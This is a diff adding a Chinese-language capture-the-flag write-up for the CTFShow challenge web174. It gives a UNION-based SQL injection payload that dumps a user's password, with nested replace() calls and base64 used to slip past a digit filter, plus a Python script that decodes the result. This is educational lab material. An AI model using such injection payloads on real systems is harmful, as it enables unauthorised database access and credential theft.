@@ -1193,6 +1193,32 @@ api/?id= 还是一如既往，开始手动注入
 
 ![](.\SQL注入\web173.png)
 
+### web174
+
+本题过滤了一切带有数字的值回显出来，那就只能使用replace()语法将数字全部转换成字母来进行注入了
+
+```
+0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),"1","@A"),"2","@B"),"3","@C"),"4","@D"),"5","@E"),"6","@F"),"7","@G"),"8","@H"),"9","@I"),"0","@J") from ctfshow_user4 where username="flag" --+
+```
+
+但是，这样子会让flag也变成加密形式，因此需要写脚本还原
+
+```
+import base64
+
+flag64 = "Y@CRmc@Bhvd@Cs@JYzcxYjRjYy@AmMjZkLTQ@BYjctYmU@JZS@AjYTMwMmFjZWU@EODZ@I"
+flag = flag64.replace("@A", "1").replace("@B", "2").replace("@C", "3").replace("@D", "4").replace("@E", "5").replace(
+    "@F", "6").replace("@G", "7").replace("@H", "8").replace("@I", "9").replace("@J", "0")
+
+print(base64.b64decode(flag))
+```
+
+最后解码得到flag的值
+
+![](F:\CTFShow-Web\Web入门\SQL注入\web174\web174.png)
+
+
+
 
 
 ## 反序列化
